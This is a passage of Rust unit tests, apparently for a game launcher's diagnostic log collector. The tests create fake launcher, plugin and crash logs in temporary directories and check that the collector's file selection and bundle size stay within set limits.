        for n in LAUNCHER_LOGS {
            write(&logs.join(n), "launcher\n");
        }
        for i in 0..4 {
            write(
                &logs.join(format!("quest/2026-10-03_10-00-0{i}/r14logs/{i}.log")),
                "q\n",
            );
        }
        let root = dir.path().join("pc");
        let bin = root.join(paths::ARENA_DIR).join("bin/win10");
        write(&bin.join("echovr.exe"), "MZ");
        for n in ["launcher.log", "runtime.log", "platform.log"] {
            write(&bin.join("EchoXR").join(n), "x\n");
        }
        for i in 0..6 {
            write(
                &root
                    .join(paths::ARENA_DIR)
                    .join(format!("_local/r14logs/[r14]-{i}.log")),
                "x\n",
            );
        }
        write(&bin.join("logs/nevr-boot.jsonl"), "{}\n");
        let nevr_dir = dir.path().join("EchoVR/logs");
        for i in 0..5 {
            write(
                &nevr_dir.join(format!("nevr-2026-10-04T10-00-0{i}.000.jsonl")),
                "{}\n",
            );
        }
        write(&nevr_dir.join("nevr-crash-1.txt"), "crash\n");
        let plugins = [
            "CombatBots",
            "DroneFix",
            "NvrAssetPatches",
            "NvrContentOverlay",
            "NvrServerPatches",
            "PowerBoost",
            "VeilNet",
        ];
        for p in plugins {
            for i in 0..3 {
                write(&bin.join(format!("plugin_logs/{p}/{p}.{i}.log")), "x\n");
            }
        }
        write(&bin.join("plugin_logs/loader.log"), "loader\n");
        let v = InstalledVersion {
            id: "pc-latest".into(),
            root: paths::normalize(&root.to_string_lossy()),
            ..Default::default()
        };
        let sources = collect_from(
            &logs,
            &nevr::log_dirs_in(dir.path()),
            &[v],
            SystemTime::now(),
        );
        assert!(sources.len() <= MAX_FILES, "{}", sources.len());
        let names: Vec<&str> = sources
            .iter()
            .filter(|s| s.kind == Kind::Plugin)
            .map(|s| s.name.as_str())
            .collect();
        for p in plugins {
            assert!(
                names
                    .iter()
                    .any(|n| n.starts_with(&format!("pc-latest.{p}."))),
                "{p} is missing: {names:?}"
            );
        }
        assert!(names.contains(&"pc-latest.loader.log"), "{names:?}");
        assert!(names.contains(&"pc-latest.nevr-boot.jsonl"));
        assert!(names.contains(&"nevr-crash-1.txt"));
        assert!(
            names.iter().any(|n| n.starts_with("nevr-2026-10-04")),
            "nEVR's own log"
        );
        // The current launcher logs are all there; only the rotated ones give way.
        let launcher: Vec<&str> = sources
            .iter()
            .filter(|s| s.kind == Kind::Launcher)
            .map(|s| s.name.as_str())
            .collect();
        for n in [
            "EchoVR_Launcher.log",
            "play.log",
            "admin-helper.log",
            "tray.log",
            "proton.log",
        ] {
            assert!(launcher.contains(&n), "{n}: {launcher:?}");
        }
    }

    #[test]
    fn bundles_within_the_limit() {
        let dir = tempfile::tempdir().unwrap();
        let big = "x".repeat(100) + "\n";
        let sources: Vec<Source> = (0..6)
            .map(|i| {
                let p = dir.path().join(format!("{i}.log"));
                std::fs::write(&p, big.repeat(100_000)).unwrap();
                Source {
                    kind: Kind::Echo,
                    name: format!("{i}.log"),
                    path: p,
                    bytes: MAX_FILE as u64,
                }
            })
            .collect();
        let b = bundle(&sources).unwrap();
        assert!(b.len() <= MAX_TOTAL + 1024, "{}", b.len());
        assert_eq!(
            String::from_utf8(b).unwrap().matches("FILE echo/").count(),
            6
        );
    }
}
